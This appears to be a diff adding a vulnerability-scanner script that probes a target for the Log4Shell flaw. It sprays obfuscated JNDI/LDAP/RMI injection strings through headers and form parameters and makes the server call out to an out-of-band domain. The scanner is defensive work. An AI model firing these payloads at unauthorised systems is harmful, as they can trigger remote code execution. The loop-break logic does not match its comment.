@@ -1,0 +1,88 @@
+#include constants.inc;
+#include helpers.inc;
+
+var targetUrl = new TURL(scanURL.url);
+
+var log4jPayloads = [
+    "${jndi:ldap://${hostName}." + oobDomain + "/log4j}",
+    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}." + oobDomain + "/log4j2}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}." + oobDomain + "/log4j3}",
+    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//${hostName}." + oobDomain + "/log4j4}",
+    "${${lower:j}ndi:${lower:rmi}://${hostName}." + oobDomain + "/log4j5}",
+];
+
+var injectionPoints = [
+    { header: "X-Forwarded-For" },
+    { header: "User-Agent" },
+    { header: "Referer" },
+    { header: "X-Api-Version" },
+    { header: "Accept-Language" },
+    { header: "X-Request-Id" },
+    { header: "Authorization", prefix: "Basic " },
+    { param: "search", method: "GET" },
+    { param: "q", method: "GET" },
+    { param: "username", method: "POST" },
+    { param: "email", method: "POST" },
+];
+
+var commonPaths = [
+    "/", "/login", "/api/", "/search", "/admin",
+    "/actuator/health", "/api/v1/", "/graphql",
+];
+
+for (var pi = 0; pi < log4jPayloads.length; pi++) {
+    var payload = log4jPayloads[pi];
+
+    for (var ii = 0; ii < injectionPoints.length; ii++) {
+        var point = injectionPoints[ii];
+
+        for (var ci = 0; ci < commonPaths.length; ci++) {
+            var job = new THTTPJob();
+            job.url = targetUrl;
+            job.URI = commonPaths[ci];
+
+            if (point.header) {
+                var val = (point.prefix || "") + payload;
+                job.request.addHeader(point.header, val);
+            } else if (point.param && point.method == "GET") {
+                job.URI = commonPaths[ci] + "?" + point.param + "=" + encodeURIComponent(payload);
+            } else if (point.param && point.method == "POST") {
+                job.verb = "POST";
+                job.postData = point.param + "=" + encodeURIComponent(payload);
+                job.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
+            }
+
+            job.execute();
+
+            if (!job.wasError) {
+                var body = job.response.body;
+                // check for JNDI error messages that confirm Log4j is in use
+                if (body.indexOf("JNDI") != -1 ||
+                    body.indexOf("log4j") != -1 ||
+                    body.indexOf("javax.naming") != -1 ||
+                    body.indexOf("InitialContext") != -1) {
+
+                    var ri = new TReportItem();
+                    ri.LoadFromFile("Application_Error.xml");
+                    ri.affects = commonPaths[ci];
+                    ri.alertPath = "Scripts/Log4Shell";
+                    ri.name = "Log4Shell (CVE-2021-44228) - Log4j RCE";
+                    ri.severity = 4;
+                    ri.setHttpInfo(job);
+                    ri.details = "Log4j JNDI injection detected via " +
+                        (point.header ? "header [bold]" + point.header + "[/bold]" :
+                         "parameter [bold]" + point.param + "[/bold]") +
+                        "[break]Payload: " + payload.substring(0, 80) +
+                        "[break]Response contains Log4j/JNDI indicators." +
+                        "[break][break]Check OOB domain (" + oobDomain + ") for callback confirmation.";
+                    AddReportItem(ri);
+                }
+            }
+        }
+
+        // only test first payload on each injection point to reduce requests
+        if (pi > 0) break;
+    }
+
+    ScriptProgress(ComputeProgress(pi, log4jPayloads.length));
+}
